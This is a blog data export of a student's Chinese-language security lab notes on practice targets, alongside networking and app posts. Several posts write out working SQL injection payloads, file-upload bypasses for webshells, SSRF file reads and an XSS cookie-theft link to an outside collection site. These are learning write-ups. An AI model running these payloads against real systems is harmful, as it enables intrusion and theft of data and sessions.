{"meta":{"title":"Tangdanhuang'blog","subtitle":null,"description":null,"author":"Tangdanhuang","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"子网划分方法","slug":"划分子网练习","date":"2019-08-28T03:48:31.350Z","updated":"2019-08-28T03:52:11.533Z","comments":true,"path":"2019/08/28/划分子网练习/","link":"","permalink":"http://yoursite.com/2019/08/28/划分子网练习/","excerpt":"2019/08/05实验笔记学习了一些子网划分的方法，进行了一些子网划分的练习","text":"2019/08/05实验笔记学习了一些子网划分的方法，进行了一些子网划分的练习 任务练习： \\1. 172.16.10.33/27属于哪个网络？该子网的广播地址是多少？ ​ 172.16.10.32/27 172.16.10.63/27 \\2. 172.16.66.10 255.255.192.0 属于哪个子网？该子网的广播地址是多少？ 172.16.64.0/18 172.16.127.255 \\3. 172.16.50.10 255.255.224.0 属于哪个子网？该子网的广播地址是多少？ 172.16.32.0/19 172.16.63.255 \\4. 172.16.45.14 255.255.255.252 属于哪个子网？该子网的广播地址是多少？ 172.16.45.12/30 172.16.45.15 \\5. 172.16.88.255/20 属于哪个子网？该子网的广播地址是多少？ ​ 172.16.80.0/20 172.16.95.255 (1)192.168.0.0/20 (2)172.144.0.0/12 (3)192.168.32.0/19 (4)192.168.96.0/20 (5)66.66.0.0/20 (6)192.168.0.0/17 (7)172.16.0.0/21 (8)192.168.128.0/18 (9)53.60.96.0/19 (10)172.16.0.0/18","categories":[],"tags":[]},{"title":"思科交换机基础操作","slug":"思科交换机基础操作","date":"2019-08-28T03:29:44.884Z","updated":"2019-08-28T03:48:20.459Z","comments":true,"path":"2019/08/28/思科交换机基础操作/","link":"","permalink":"http://yoursite.com/2019/08/28/思科交换机基础操作/","excerpt":"2019/08/05实验笔记学习了一些思科交换机的基础操作","text":"2019/08/05实验笔记学习了一些思科交换机的基础操作 任务一：熟悉PT面板及配置设备的模式与基本命令 任务二：Telnet的配置与实现 任务拓扑 由用户模式进入特权模式 进入全局配置模式 设置提示符为sw1 设置管理交换机的IP地址 启用接口 配置进入特权模式的密码为123456 进入VTY端口 设置Telnet的登录密码为1234567 允许Telnet登录 配置好pc机的地址 打开pc机命令行进行Telnet连接验证 任务三：IOS的备份与升级 任务拓扑 开启服务器的ftp服务 查看ios文件 备份ios文件 升级ios 查看ios文件，发现剩余的空间还很多，不过这里我还是想试着删除一下ios 删除ios文件 再从服务器下载升级的ios文件 重启交换机，升级完成 任务四：配置文件的备份与还原 任务拓扑 配置交换机 设置管理交换机的IP地址 备份交换机配置文件 还原交换机配置文件","categories":[],"tags":[]},{"title":"文件上传绕过练习、图片马上传","slug":"文件上传绕过练习","date":"2019-08-24T09:32:45.223Z","updated":"2019-08-24T09:45:43.393Z","comments":true,"path":"2019/08/24/文件上传绕过练习/","link":"","permalink":"http://yoursite.com/2019/08/24/文件上传绕过练习/","excerpt":"2019/08/03实验笔记进行了一些基础的文件上传绕过的练习，感觉还是蛮有收获。","text":"2019/08/03实验笔记进行了一些基础的文件上传绕过的练习，感觉还是蛮有收获。 任务1：upload-labs/less-3 1、构建一句话木马，使其格式为jpg 2、上传抓包，修改其格式为.php.jpg 3、放包，上传成功 4、使用蚁剑进行连接验证。 任务2：upload-labs/less-4 1、可以看一下他过滤的名单然后再构建木马，使其格式为.htaccess，内容如下 &lt;FilesMatch “gg.jpg”&gt; SetHandler application/x-httpd-php 之后上传的文件都会以PHP格式执行 2、再次上传文件名为gg的一句话木马，格式为jpg 3、使用蚁剑连接刚刚的gg木马验证连接 任务3：upload-labs/less-7 1、查看源码，还是黑名单，但是没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过 2、上传抓包 3、放包，上传成功 4、执行11.php 成功 任务4：upload-labs/less-8 查看源码，发型过滤了大部分的格式，连.htaccess也过滤了，但是没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过： 1、设置一句话木马，构建格式为jpg 2、上传抓包，修改其格式为.php::$DATA 3、放包，上传成功 4、使用蚁剑连接刚刚上传的木马 任务5：upload-labs/less-9 1、查看源码，发型过滤了大部分的格式，连.htaccess也过滤了，因此考虑后缀名绕过 2、设置一句话木马，构建格式为jpg 3、上传抓包，修改其格式为php. . 4、放包，上传成功 5、使用蚁剑连接刚刚上传的木马 任务6：upload-labs/less-10 1、查看代码，发现是替代后缀，网上查阅资料发现建议使用双写，使用之后觉得没有用，于是使用图片马 2、制作图片马 3、上传 4、使用蚁剑进行连接验证 任务7：upload-labs/less-13 1、根据题目要求是上传图片马 2、制作图片马 3、上传，抓包 4、使用蚁剑进行连接验证 任务8：upload-labs/less-14 1、根据题目要求是上传图片马 2、制作图片马 3、上传，抓包 4、使用蚁剑测试 任务9：upload-labs/less-15 1、根据题目要求是上传图片马，这里用到php_exif模块来判断文件类型，没有打开的需要在PHPstudy里面手动打开 2、制作图片马 3、上传，抓包 4、使用蚁剑测试 任务10：upload-labs/less-16 1、根据题目要求是上传图片马 2、制作图片马 4、上传之后，发现图片马被二次渲染了，里面的一句话密码已经不见了，此时打开winhex，将上传之前和上传之后的文件做对比，找到没有被二次渲染的部分 蓝色的部分就是没有被二次渲染的部分，把一句话木马写到这个部分里面 此时再次上传，上传完成之后对比上传前后的hex码 这时可以看到，一句话木马还在，没有被删除 4、使用蚁剑测试 连接成功 任务11：upload-labs/less-18 1、构建图片马上传 2、发现文件上传之后存储之后会重命名，因此从新构建图片马，够完成竞争上传，使之能在执行时创建shell，从而达到上传图片马连接的目的 3、上传抓包 4、设置好上传的参数，开始攻击 4、在上传的时候在浏览器疯狂对http://172.16.13.28/upload-labs/include.php?file=upload/3.gif按刷新 在文件重命名之前执行文件 这里虽然执行了，但是并没有生成shell。。。。。难受 任务12：upload-labs/less-19 1、构建一句话木马 2、上传，抓包，修改文件名称为11.php. . 3、放包，上传成功 4、测试 生成了shell文件，测试成功","categories":[],"tags":[]},{"title":"Nmap基础实验、利用ms17_010","slug":"Nmap操作练习、利用ms17_010","date":"2019-08-24T09:20:02.806Z","updated":"2019-08-24T09:50:52.732Z","comments":true,"path":"2019/08/24/Nmap操作练习、利用ms17_010/","link":"","permalink":"http://yoursite.com/2019/08/24/Nmap操作练习、利用ms17_010/","excerpt":"2019/08/02实验笔记练习了nmap的基本操作。","text":"2019/08/02实验笔记练习了nmap的基本操作。 任务1：Nmap扫描练习 1、扫描单个ip 2、扫描多个ip 3、扫描一个范围的目标地址 4、扫描一个范围内的目标地址 5、扫描主机列表targets.txt中所有的目标地址 6、扫描除某一目标地址之外的所有目标地址 7、扫描除某一文件中的目标地址之外的目标地址 8、扫描除某一目标地址的21、22、23、80端口 9、对目标地址进行路由追踪 10、扫描目标地址所在C段的在线状态 11、目标地址的操作系统指纹识别 12、目标地址提供的服务版本检测 13、探测防火墙状态 14、鉴权扫描 15、暴力破解 16、常见漏洞扫描 17、利用ms17_010 打开Msfconsole 搜索漏洞模块 使用模块 设置被攻击机地址 开始攻击 成功进入 创建一个文件 在靶机中查看是否创建成功 18、探测局域网内更多服务开启的情况 19、解析域名 20、打开防火墙关闭icmpv4，使用nmap对其进行探测判断是否存活 开启防火墙，关闭防火墙关于icmpv4的项目，再去ping目标机 发现ping不通了 此时使用nmap对其进行存活状态扫描发现是up，是活着的","categories":[],"tags":[]},{"title":"文件上传实验","slug":"文件上传","date":"2019-08-24T09:09:41.833Z","updated":"2019-08-24T09:23:20.807Z","comments":true,"path":"2019/08/24/文件上传/","link":"","permalink":"http://yoursite.com/2019/08/24/文件上传/","excerpt":"2019/08/01实验笔记体验了ssrf漏洞的使用方法，尝试了上传一句话木马的方法。","text":"2019/08/01实验笔记体验了ssrf漏洞的使用方法，尝试了上传一句话木马的方法。 任务1：文件上传类型绕过 1、编写一句话木马 2、上传，抓包，修改文件的类型为jpeg 上传成功， 3、使用蚁剑连接刚刚上传的木马 成功 任务2：upload-labs/less-2 1、编写一句话木马 2、上传，抓包，修改文件的类型为png 上传成功 4、使用蚁剑连接刚刚上传的木马 任务3：文件截断绕过上传less-11 1、构建一句话木马，格式为.jpg 2、上传抓包，修改上传路径为.php%00 放包 3、使用蚁剑连接刚刚上传的木马 成功 任务4：upload/less-12 1、构建一句话木马 2、上传，抓包，可以看到这里的save_path是通过post传进来的 3、将save_path改为/hihack.php+ 4、修改+为00，在二进制中修改 放包 5、在蚁剑中连接这个木马 成功 任务5：竞争上传 1、构建一句话木马 2、上传，等待时间结束，发现上传的文件已经被删除了 3、打开第二个网站，在文件被删除之前执行文件 可见11.php已经执行了 查看文件夹 发现11.php已经被删除了，而11执行在被删除之前生成了shell 任务6：文件上传upload-labs/less-17 1、构建一句话木马 2、上传抓包，设置为100个线程，在没有被删除的时候乘机执行程序 3、使用蚁剑连接这个木马尝试连接 成功 任务7：暴力破解 1、分析源码可以得到密码会经过md5加密然后与数据库对比进行登录验证，所以这里的用户名猜测为唯一的md5加密密码的用户test 2、使用test进行登录抓包 3、设置字典，设置线程 4、开始暴力破解攻击 5、得到密码 6、登录验证","categories":[],"tags":[]},{"title":"SSRF和一句话木马上传","slug":"SSRF和一句话木马上传","date":"2019-08-24T08:50:42.846Z","updated":"2019-08-24T09:22:58.748Z","comments":true,"path":"2019/08/24/SSRF和一句话木马上传/","link":"","permalink":"http://yoursite.com/2019/08/24/SSRF和一句话木马上传/","excerpt":"2019/07/31实验笔记体验了ssrf漏洞的使用方法，尝试了上传一句话木马的方法。","text":"2019/07/31实验笔记体验了ssrf漏洞的使用方法，尝试了上传一句话木马的方法。 任务1：url跳转到一个公网地址 172.16.13.32/ssrf.php?url=www.baidu.com 可以看到这里的百度的发布的年份是2018年的，而现在的百度是2019所以访问成功 任务二：通过ssrf访问内网 172.16.13.32/ssrf.php?127.0.0.1 任务三：访问目标机的信息 172.16.13.20/ssrf.php?file:///C:/windows/win.ini 任务四：绕过jsp上传一句话木马 1、制作一句话木马 2、发现只允许上传jpg文件 3、修改文件类型再上传 但是这样上传之后并不能执行所以现在使用抓包 4、抓包修改之后再上传 将这里的文件类型改为.php 5、使用菜刀编辑连接 6、测试 成功 任务五：绕过禁止PHP上传一句话木马 1、构建一句话木马 2、上传 上传失败，文件类型不能为PHP 3、修改文件名为hihack.php.jpg 上传成功 4、使用菜刀验证 成功。 任务六：upload-labs/Pass-01 1、进入任务，上传php文件发现失败 查看提示 2、构建一句话木马，修改木马的格式为jpg 3、上传时抓包，修改格式为php 放包 4、使用菜刀连接刚才上传的木马 连接成功！ 任务七：upload-labs/Pass-05 1、进入任务，上传php文件发现失败 查看提示 2、修改一句话木马的格式 把木马格式修改为jpg，使用burpsuite进行抓包 修改格式为.phP 放包 上传成功 3、使用菜刀连接方才上传的木马 成功 任务七：upload-labs/Pass-06 1、修改一句话木马的格式为jpg 2、抓包进行修改格式 将木马格式修改为.php.jpg 放包 修改成功 3、使用中国菜刀 成功连接 今日的随笔","categories":[],"tags":[]},{"title":"获取cookie验证身份","slug":"获取cookie","date":"2019-08-24T08:42:13.935Z","updated":"2019-08-24T09:23:31.285Z","comments":true,"path":"2019/08/24/获取cookie/","link":"","permalink":"http://yoursite.com/2019/08/24/获取cookie/","excerpt":"2019/07/30实验笔记今天学习了几种获取cookie达到身份验证的效果","text":"2019/07/30实验笔记今天学习了几种获取cookie达到身份验证的效果 任务1：XSS反射型获取cookie 1、通过在线平台生成一个获取cookie的连接，然后在DVWA点击按钮的时候抓包再把name的值改为刚刚获取的连接。 GET /DVWA/vulnerabilities/xss_r/?name=https://xsshs.cn/GFRf/xss.jpg HTTP/1.1 2、利用社工学的手法发送给朋友 当有人点击这个网站的时候就会获取他的cookie 任务2：创建存储型XSS注入 1、在网页的输入框中输入在线平台的XSS模块 2、等待有人刷新网页 3、查看获取cookie状态 我的外网ip为248，分别抓到了小组成员249,250. 任务3：利用cookie 1、在登陆时使用burpsuite抓包 此时，登陆是失败的 2、把之前获得的cookie复制过来 此时发送就可以登陆了 任务4：利用CSRF获取cookie修改密码 1、首先A在正常的网页上登陆，然后修改密码 2、此时B抓包 删除Referer 此时使用CSRFPoC工具 选择使用浏览器测试 将连接复制到使用burpsuite代理的浏览器 http://burp/show/2/otdm948noidyecvgqwr2hdnjugekqyeg 点击之后 此时退出登陆，再次登陆进行验证，登陆成功。 ​","categories":[],"tags":[]},{"title":"WAF绕过基础实验","slug":"WAF绕过","date":"2019-08-19T00:48:34.325Z","updated":"2019-08-24T09:22:56.583Z","comments":true,"path":"2019/08/19/WAF绕过/","link":"","permalink":"http://yoursite.com/2019/08/19/WAF绕过/","excerpt":"2019/07/29实验笔记通过报错和反馈逐步分析到底过滤了什么东西，从而绕过WAF。","text":"2019/07/29实验笔记通过报错和反馈逐步分析到底过滤了什么东西，从而绕过WAF。 任务1：简单是SQL注入1 1、判断服务器接收的字符类型 依次输入1 1’ 1’’ 由此可知为字符型 2、爆库 -1’//union//select//databasae()//‘ 3、爆表 -1’//union//select/**/ (select//table_name//from//information_schema.tables//where//table_sctable_schemahema=database()//limit//0,1)//‘ 4、爆字段 -1’//union//select/**/ (select//column_namcolumn_namee//from//information_scheminformation_schema.columnsa.columns//where//table_sctable_schemahema=’web1’//and//table_name=’flag’//limit//0,1)//‘ 这里是服务器的问题，不过好在根据题目知道字段名为flag 5、爆数据 -1’ union//select//flag from//web1.flag where//‘1’=’1 任务2：简单SQL注入2 1、测试服务器接收数据类型 依次输入1 1’ 1’’ 由此可知为字符型 2、爆库 -1’//union//select//databasae()//‘ 3、爆表 -1’//union//select/**/ (select//table_name//from//information_schema.tables//where//table_schema=database()//limit//0,1)//‘ 4、爆字段 -1’//union//select/**/ (select//column_name//from//information_schema.columns//where//table_schema=database()//and//table_name//limit//0,1)//‘ 服务器无反应，但是已经知道是求flag的值 5、爆数据 -1’//union//select//flag//from//web1.flag//where/**/‘1’=’1 任务3：简单SQL注入3 1、测试服务器接收数据类型 依次输入1 1’ 1’’ 2、爆库 1’ and substr(database(),1,1)=’x 使用burpsuite抓包，进行攻击 依次爆出可得库名是web1 3、爆表 1’ and substr((select table_name from information_schema.tables where table_schema=’web1’ limit 0,1),1,1)=’x 使用burpsuite抓包，进行攻击 依次可得表名为flag 4、爆字段 1’ and substr((select column_name from information_schema.columns where table_schema=’web1’ and table_name=’flag’ limit 0,1),1,1)=’x 这里服务器有问题，但已知要求的是flag的值 5、爆数据 1’ and substr((select flag from web1.flag limit 0,1),1,1)=’ 上面的方法太麻烦 选择使用sqlmap跑出flag的值 任务4：反射型XSS低级 1、找到注入点 2、构建注入语法”&gt;alert(1) 任务5：反射型XSS中级 1、确定注入点 2、构建注入语法 “&gt;alert(1) 任务6：高级反射型XSS 1、确定注入点 2、构建注入语法 &lt;img src=# onerror=alert(“xss”)&gt;","categories":[],"tags":[]},{"title":"简单的堆叠、二次、宽字符、cookie注入","slug":"堆叠，二次，宽字符，cookie注入","date":"2019-08-17T09:41:06.323Z","updated":"2019-08-24T09:23:36.478Z","comments":true,"path":"2019/08/17/堆叠，二次，宽字符，cookie注入/","link":"","permalink":"http://yoursite.com/2019/08/17/堆叠，二次，宽字符，cookie注入/","excerpt":"2019/07/26实验笔记​ 今天练习了一些简单基础的堆叠注入，二次注入，宽字符注入，cookie注入，再一次认识到了注入的方法和思想和注入的工具同样的重要","text":"2019/07/26实验笔记​ 今天练习了一些简单基础的堆叠注入，二次注入，宽字符注入，cookie注入，再一次认识到了注入的方法和思想和注入的工具同样的重要 任务1对web/duidie.php进行堆叠查询1、判断出数据库名是4位 id=1;select if(length(database())&gt;=4,sleep(5),1) 通过是否睡眠进行判断 2、爆库名 id=1;select if(substr(database() ,1,1)=’x’,sleep(5),1) 使用burpsuite进行抓包 得出库名为test 3、爆表（这里爆的是第二个表） id=1;select if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 1,1),1,1)=’x’,sleep(5),1) 这里得到表名为users 4、爆字段 id=1;select if(substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 1,1),1,1)=’x’,sleep(5),1) 依次可得到字段为username 5、爆数据 id=1;select if(substr((select username from test.users limit 0,1),1,1)=’x’,sleep(5),1) 可以得到数据zhangsan依次类推 任务2对webp/double1进行二次注入攻击1、确定字段 [webp/double1.php/?username=test’ order by 4%23 ](http://172.16.13.23/webp/double1.php/?username=test&#39; order by 4%23) webp/double2.php/?id=8 webp/double1.php/?username=test’ order by 3%23 输入id=10时没有报错说明有3个字段 2、确定显示位置 webp/double1.php/?username=test’ union select 1,2,3 –+ webp/double2.php/?id=11 说明2,3可以显示 3、爆库 webp/double1.php/?username=test’ union select 1,2,database() –+ webp/double2.php/?id=13 4、爆表 webp/double1.php/?username=test’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’test’) –+ double2.php/?id=14 5、爆字段 webp/double1.php/?username=test’ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’) –+ webp/double2.php/?id=16 6、爆数据 webp/double1.php/?username=test’ union select 1,2,(select group_concat(username,password) from test.users) –+ webp/double2.php/?id=17 拓展任务：对sqli/less-24进行二次注入 由于这里的admin’#已经被注册了所以这里我们自己创建一个test1来测试这里test1的密码为99999999 这里我们创建一个新用户为test1’# 使用test1’#修改密码 这里修改密码为123456 此时我们尝试用123456登陆test1 说明修改成功 任务3：宽字符注入攻击 1、确定注入类型 输入id=1’ 时，发现’被\\转义了，所以这里用宽字节注入。 2、确定字段数 1%df’ order by 6%23 1%df’ order by 7%23 可以得出字段数为6 3、确定显示字段 -1%df’ union select 1,2,3,4,5,6%23 4、爆库 -1%df’ union select 1,database(),3,4,5,6%23 这里的库名为test 5、爆表 -1%df’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=(select(database()))),3,4,5,6%23 这里可以看到表person、users、xss 6、爆表 -1%df’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=(select(database())) and table_name=(select table_name from information_schema.tables where table_schema=(select(database())) limit 0,1)),3,4,5,6%23 7、爆数据 -1%df’ union select 1,2,3,(select group_concat(username,password) from test.users),5,6 %23 任务4、对webp/cookie.php进行cookie注入 1、判断类型 没有参数提示 2、抓包判断 Id=1 id=1 and 1=1 id=1 and 1=2 说明cookie存在注入 3、判断字段数 说明有6个字段 4、判断显示字段 -1 union select 1,2,3,4,5,6 5、爆库 -1 union select 1,2,database(),4,5,6 6、爆表 -1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),4,5,6 7、爆字段 -1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’),4,5,6 8、爆数据 -1 union select 1,2,(select group_concat(id,username,password) from test.users),4,5,6 拓展任务2：对sqli/less-20进行cookie注入 1、登陆Dumb，在登陆成功的界面进行抓包 2、判断注入的字符类型及是否存在注入 Dumb’ Dumb’ and 1=1 –+ Dumb’ and 1=2–+ 可以知道注入为字符型且存在sql注入 3、判断字段数 说明字段数为3 4、判断显示字段位置 5、爆库 -Dumb’ union select 1,2,database() –+ 6、爆表 -Dumb’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’) –+ 7、爆字段 -Dumb’ -1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’) –+ 8、爆数据 -Dumb’ union select 1,2,(select group_concat(id,username,password) from security.users) –+","categories":[],"tags":[]},{"title":"简单的布尔盲注，报错注入，时间盲注","slug":"布尔盲注报错注入时间盲注","date":"2019-08-17T09:25:41.280Z","updated":"2019-08-24T09:23:41.734Z","comments":true,"path":"2019/08/17/布尔盲注报错注入时间盲注/","link":"","permalink":"http://yoursite.com/2019/08/17/布尔盲注报错注入时间盲注/","excerpt":"2019/07/25实验笔记这里的盲注是通过判断之后再使用burpsuite进行狙击手模式的攻击，从而爆出库、表、字段、数据","text":"2019/07/25实验笔记这里的盲注是通过判断之后再使用burpsuite进行狙击手模式的攻击，从而爆出库、表、字段、数据 对webp/boolean.php进行布尔盲注 1、判断注入点 2、判断数据库名的长度 [http://172.16.13.21/webp/boolean.php?id=1%27%20and%20length(database())%3E=5%23](http://172.16.13.21/webp/boolean.php?id=1&#39; and length(database())&gt;=5%23) [http://172.16.13.21/webp/boolean.php?id=1%27%20and%20length(database())%3E=4%23](http://172.16.13.21/webp/boolean.php?id=1&#39; and length(database())&gt;=4%23) 3、爆库得到库名 [http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr(database(),1,1)=%27x%27%23](http://172.16.13.21/webp/boolean.php?id=1&#39; and substr(database(),1,1)=’x’%23) 说明库的第一个字是t,同理得到库名为test 4、爆表 [http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27test%27%20limit%200,1),1,1)=%27x%27%23](http://172.16.13.21/webp/boolean.php?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’x’%23) 使用Burpsuite可得第一个表的第一个字为p 同理可得第一个表名为person 5、爆字段 [http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27test%27%20%20and%20table_name=%27person%27%20limit%200,1),1,1)=%27x%27%23](http://172.16.13.21/webp/boolean.php?id=1&#39; and substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’person’ limit 0,1),1,1)=’x’%23) 使用Burpsuite可得第一个表的第一个字段的第一个字为id 同理得第一个表的第一个字段id 同理得第一个表的第二个字段username 同理得第一个表的第三个字段money 6、爆数据 [http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr((select%20username%20from%20test.person%20limit%200,1),1,1)=%27x%27%23](http://172.16.13.21/webp/boolean.php?id=1&#39; and substr((select username from test.person limit 0,1),1,1)=’x’%23) 使用Burpsuite可得第一个表的username字段的第一个字为w 同理得第一个表的username字段的第一个数据为wangwu 对sqli/less-8进行布尔注入 1、判断注入点 2、爆库 [http://172.16.13.21/sqli/less-8/?id=1%27%20and%20substr(database(),1,1)=%27x%27%23](http://172.16.13.21/sqli/less-8/?id=1&#39; and substr(database(),1,1)=’x’%23) 使用burpsuite拦截，进行攻击 得出数据库名的第一个字为：s 依次可得出数据库名为security 3、爆表 [http://172.16.13.21/sqli/less-8/?id=1%27%20and%20substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),1,1)=%27%27%20--+](http://172.16.13.21/sqli/less-8/?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1)=’’ –+) 得出数据库的第一个表名为：emails 4、爆数据 http://172.16.13.21/sqli/less-8/?id=1&#39; and substr((select column_name from information_schema.columns where table_schema=’security’ and table_name=’emails’ limit 0,1),1,1)=’x’ –+ 得出第一个字段为id 得出第二个字段为email 5、爆数据 http://172.16.13.21/sqli/less-8/?id=1&#39; and substr((select id from security.emails limit 0,1),1,1)=’x’ –+ 对webp/error.php进行报错注入攻击 1、注入测试 ?username=a ?username=a’ ?username=’ ‘ a ‘ ‘ ‘ 2、爆库 ?username=a’ and updatexml(1,concat(0x7e,(database()),0x7e),1)–+ 3、爆表 4、爆字段 ?username=a’ and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=’test’ and table_name=’person’),0x7e),1)–+ 5、爆数据 ?username=a’ and updatexml(1,concat(0x7e,(select group_concat(username,money) from test.person),0x7e),1)–+ 对sqli/less-5进行报错注入攻击 1、测试 2、爆库 ?id=a’ and updatexml(1,concat(0x7e,(database()),0x7e),1)–+ 3、爆表 [http://172.16.13.21/sqli/less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27%20),0x7e),1)%23](http://172.16.13.21/sqli/less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’ ),0x7e),1)%23) 4、爆字段 ?id=a’ and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=’security’ and table_name=’users’),0x7e),1)–+ 5、爆数据 ?id=a’ and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)–+ 这里可以看到数据没有显现完 这里使用limit来一条一条显示 ?id=a’ and updatexml(1,concat(0x7e,(select username from security.users limit 0,1),0x7e),1)–+ 对webp/time.php进行时间盲注 1、检测是否存在Boolean注入 http://172.16.13.21/webp/time.php?id=1 http://172.16.13.21/webp/time.php?id=1 and 1=1 http://172.16.13.21/webp/time.php?id=1 and 1=2 2、测试数据库名字长度 http://172.16.13.21/webp/time.php?id=1 and if(length(database())%3E=1,sleep(4),1) 可以看到这里在sleep，判断成功 3、爆库 1 and if(substr(database() ,1,1)=’x’,sleep(3),1) 若正确则为world，错误则为hello world 再次进行抓包 同理可得数据库名为test 4、爆表 1 and if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’x’,sleep(3),1) 抓包 可得表的第一个字为p 最后可得表名为person 5、爆字段 1 and if(substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’person’ limit 0,1),1,1)=’x’,sleep(3),1) 抓包 可得第一个字段为id 6、爆数据 1 and if(substr((select id from test.person limit 0,1),1,1)=’x’,sleep(3),1) 抓包 可以得到数据id=1 对sqli/less-9进行时间布尔盲注 1、测试是否有布尔注入 1 1’ 1’ and sleep(3)–+ -1’ and sleep(3)–+ 2、爆库 id=1’ and if(substr(database(),1,1)=’x’,sleep(3),1)–+ 依次可以得出库名security 3、爆表 id=1’and if (substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1)=’x’,sleep(3),1) –+ 依次可得表名为referers 4、爆字段 id=1’and if (substr((select column_name from information_schema.columns where table_schema=’security’and table_name=’referers’ limit 0,1),1,1)=’x’,sleep(3),1) –+","categories":[],"tags":[]},{"title":"设置数据库远程连接和简单的sql注入","slug":"数据库远程连接的操作和简单的sql注入","date":"2019-08-17T08:57:26.776Z","updated":"2019-08-24T09:23:22.933Z","comments":true,"path":"2019/08/17/数据库远程连接的操作和简单的sql注入/","link":"","permalink":"http://yoursite.com/2019/08/17/数据库远程连接的操作和简单的sql注入/","excerpt":"2019/07/24实验笔记","text":"2019/07/24实验笔记 任务1：部署线下的几个平台 任务2：设置数据库可以远程访问 mysql&gt; show databases; //显示数据库 mysql&gt; use mysql； //使用mysql数据库； mysql&gt; show tables；//查看表； mysql&gt; select host, user,password from user; //查看host，user，password三个字段的内容 mysql&gt; update user set host=(‘%’) where host=’127.0.0.1’; //把host为127.0.0.1的值修改为% mysql&gt; flush privileges; //刷新（刷新之后才会生效） mysql&gt; select host, user,password from user; 再次查看 任务3：根据小组建库及操作 1、建库 ​ create database qizu； ​ 2、建表：表名为information ​ create table information； ​ 3、建字段：ID设置为主键，Username，Password，Address，Telephone ​ create table information（ ​ id int auto_increment primary key, ​ Username varchar(12), ​ password varchar(16), ​ Address varchar(30), ​ Telephone int(11) ​ ）default charset=utf8; ​ 4、把自己的小组成员信息输入表中 ​ insert into information value(‘1’,’刘瑞祥’,’password’,’四川’,’12345678901’); ​ 5、新增字段age ​ alter table information add(age int(3)); ​ 6、将username的汉字改为拼音 ​ update information set Username=’liuruixiang’ where Username=’刘瑞祥’; ​ 7、查询年龄在21-22岁的同组成员 ​ select Username from information where age between 21 and 22; 或者 select Username from information where age &gt;= 21 and age&lt;= 22; 任务4：完成http://127.0.0.1/db/sql_injection/sql_num.php sql注入数字型 1’ and ‘1’=’1’ and ‘1’=’2’ //前三个判断是否可以让我们注入 1 order by 1-99 //判断字段数为3 -1 union select 1,2,3//得知只有2,3可以显示 -1 union select 1,2,database() //爆库为pentest -1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’pentest’)// 爆表 -1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=’pentest’ and table_name=’news’) //爆字段 -1 union select 1,2,(select group_concat(id,title) from pentest.news) //爆数据","categories":[],"tags":[]},{"title":"制作一个简单的小说阅读器","slug":"制作一个简单的小说阅读器","date":"2019-08-17T07:19:05.450Z","updated":"2019-08-24T09:23:17.793Z","comments":true,"path":"2019/08/17/制作一个简单的小说阅读器/","link":"","permalink":"http://yoursite.com/2019/08/17/制作一个简单的小说阅读器/","excerpt":"2019/07/23实验笔记（三）制作了一个调用百度语音的接口来实现小说阅读的小程序","text":"2019/07/23实验笔记（三）制作了一个调用百度语音的接口来实现小说阅读的小程序 这里项目经理给我们提出了一个问题： 目前常见的应用程序结构类型有哪些？？ 一时间我答不上来，之后在网上自己查看了资料总结了下 ​ C：客户端应用​ B/S：浏览器与服务器​ C/S：客户端与服务器​ Hybrid-App：混合应用结构 B/S+C/S C/S+B/S​ 混合应用：多采用HCJ技术做为基础​ 各种公司的技术框架：​ dcloud（H5/H5+ wap2App mui uni-app：H5 H5+app 小程序）​ ↑​ 联合应用 下面进入正题： 首先在index下面写下JS方法 再在js的文件夹下面写两个js函数 var是创建了一个变量赋予它百度语音接口的地址 ​ 第一个函数是获得文本框内内容，并判断文本框内是否有值，如果值为空，函数就会被截断，后面的代码就不执行了；后面的内容是把文本框里面的内容加到变量url后面，通过播放器和百度的语音接口读出文本的内容。 ​ 第二个函数是控制播放器的，点击按钮的时候如果是暂停的就播放，反之则暂停 编辑完网页之后就可以使用HBuilder X进行App云端打包 我没有勾选广告然后点打包，之后就在网上打包好，下载下来就可以安装了 下面是安装好的app的样式，由于只是个功能性的测试，没有这么装饰过，有点丑 